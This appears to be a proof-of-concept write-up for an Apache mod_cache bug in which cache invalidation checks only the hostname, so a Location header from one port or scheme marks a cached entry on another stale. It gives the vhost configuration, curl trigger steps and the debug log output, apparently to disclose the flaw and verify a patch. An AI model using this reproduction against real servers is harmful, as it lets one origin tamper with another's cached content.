# PoC 084 - Cross-Origin Cache Invalidation Ignores Scheme And Port

`cache_invalidate()` only checks hostname equality before invalidating cache
entries derived from `Location` / `Content-Location`, so a response on one
port can mark a cached entity on another port stale.

## Setup

Two virtual hosts on the same hostname, different ports, sharing one disk
cache. The backend port-8080 vhost emits `Location` pointing at the cached
port-9090 entity.

`/etc/apache2/httpd.conf`:

```apache
ServerName example.test
Listen 8080
Listen 9090
LoadModule mpm_event_module modules/mod_mpm_event.so
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule cache_module modules/mod_cache.so
LoadModule cache_disk_module modules/mod_cache_disk.so
LoadModule headers_module modules/mod_headers.so
LoadModule rewrite_module modules/mod_rewrite.so

CacheRoot /var/cache/apache2
CacheEnable disk /
CacheIgnoreNoLastMod On
CacheDefaultExpire 3600

DocumentRoot "/srv/www"

<VirtualHost *:9090>
    ServerName example.test
    DocumentRoot "/srv/www/v9090"
    <Location "/victim.css">
        Header set Cache-Control "public, max-age=3600"
    </Location>
</VirtualHost>

<VirtualHost *:8080>
    ServerName example.test
    DocumentRoot "/srv/www/v8080"
    # Generates a 201 Created with a cross-port Location header.
    RewriteEngine On
    RewriteRule "^/update$" "-" [R=201,L,E=mark:1]
    Header always set Location "http://example.test:9090/victim.css" env=mark
</VirtualHost>
```

Set `127.0.0.1 example.test` in `/etc/hosts`. Place
`/srv/www/v9090/victim.css` with stable contents.

## Trigger

```bash
# 1. Prime the cache for the port-9090 origin.
curl -s http://example.test:9090/victim.css -o /dev/null
ls /var/cache/apache2     # entity for v9090 victim.css now on disk

# 2. POST to port-8080; response carries Location for example.test:9090.
curl -i -X POST http://example.test:8080/update

# 3. Re-fetch the cached resource and observe revalidation/refetch.
curl -i http://example.test:9090/victim.css
```

## Observed effect

After step 2, the disk-cache header file for the port-9090 entity is marked
invalidated:

```bash
$ find /var/cache/apache2 -name '*.header' -exec head -c 32 {} \;
# Status flag flips from CACHE_DISK_FORMAT_VERSION valid to invalidated.
```

In step 3 the `X-Cache` debug header (with `LogLevel cache:debug`) shows the
entry was treated as stale:

```text
[cache:debug] cache_select: ... entity invalidated, revalidating
```

A follow-up request hits the origin instead of the cache, even though the
POST was directed at a different port (`8080`) and only the hostname matched.

## Log marker

`error_log` (with `LogLevel cache:debug`):

```text
[cache:debug] AH00698: cache: invalidating cache entry for http://example.test:9090/victim.css
```

The patched build refuses to invalidate because the effective-port comparison
fails (`8080 != 9090`).

## Notes

- The same trigger works across schemes: `Location: https://example.test/...`
  from an HTTP origin invalidates a cached HTTPS entry.
- The Content-Location path is identical; substitute
  `Header always set Content-Location ...` for the second vector.
